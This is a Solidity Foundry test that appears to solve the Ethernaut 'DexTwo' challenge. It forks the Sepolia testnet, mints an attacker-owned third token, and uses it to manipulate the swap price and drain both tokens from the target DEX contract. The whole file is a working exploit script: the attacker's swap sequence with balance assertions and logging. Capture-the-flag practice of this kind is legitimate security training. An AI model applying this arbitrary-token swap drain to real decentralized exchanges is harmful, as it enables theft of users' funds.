// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {TokenC} from "../src/23-DexTwo/TokenC.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns (address);
    function token2() external view returns (address);
}


contract TestDexTwo is Test {
    address private constant TARGET_ADDRESS = 0x1da438e60a6CFefd4544e7BA722465e470cF6556;
    uint256 private constant INITIAL_ATTACKER_BALANCE = 10;
    uint256 private constant INITIAL_DEX_BALANCE = 100;
    IDexTwo target;
    TokenC tokenC;
    address attacker;
    address token1;
    address token2;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        tokenC = new TokenC();
        target = IDexTwo(TARGET_ADDRESS);
        attacker = vm.addr(vm.envUint("PRIVATE_KEY"));       
        token1 = target.token1();
        token2 = target.token2();
    }

    function testDexTwo() public {
        uint256 balanceOfAttackerToken1 = target.balanceOf(token1, attacker);   
        uint256 balanceOfAttackerToken2 = target.balanceOf(token2, attacker);

        uint256 balanceOfDexToken1 = target.balanceOf(token1, TARGET_ADDRESS);   
        uint256 balanceOfDexToken2 = target.balanceOf(token2, TARGET_ADDRESS);   
        
        assert(balanceOfAttackerToken1 == INITIAL_ATTACKER_BALANCE);
        assert(balanceOfAttackerToken2 == INITIAL_ATTACKER_BALANCE);
        
        assert(balanceOfDexToken1 == INITIAL_DEX_BALANCE);
        assert(balanceOfDexToken2 == INITIAL_DEX_BALANCE);

        vm.startPrank(attacker, attacker);
        tokenC.mint(attacker, 2);

        tokenC.mint(TARGET_ADDRESS, 1);
        IERC20(address(tokenC)).approve(TARGET_ADDRESS, 1);
        target.swap(address(tokenC), token1, 1);

        tokenC.burn(TARGET_ADDRESS, 1);
        IERC20(address(tokenC)).approve(TARGET_ADDRESS, 1);
        target.swap(address(tokenC), token2, 1);

        vm.stopPrank();

        uint256 finalBalanceOfAttackerToken1 = target.balanceOf(token1, attacker);   
        uint256 finalBalanceOfAttackerToken2 = target.balanceOf(token2, attacker);

        uint256 finalBalanceOfDexToken1 = target.balanceOf(token1, TARGET_ADDRESS);   
        uint256 finalBalanceOfDexToken2 = target.balanceOf(token2, TARGET_ADDRESS);

        assert(finalBalanceOfDexToken1 == 0 && finalBalanceOfDexToken2 == 0);
        console2.log("Final Dex balance of token 1: ",finalBalanceOfDexToken1);
        console2.log("Final Dex balance of token 2: ",finalBalanceOfDexToken2);
        console2.log("Final attacker balance of token 1: ",finalBalanceOfAttackerToken1);
        console2.log("Final attacker balance of token 2: ",finalBalanceOfAttackerToken2);

    }

}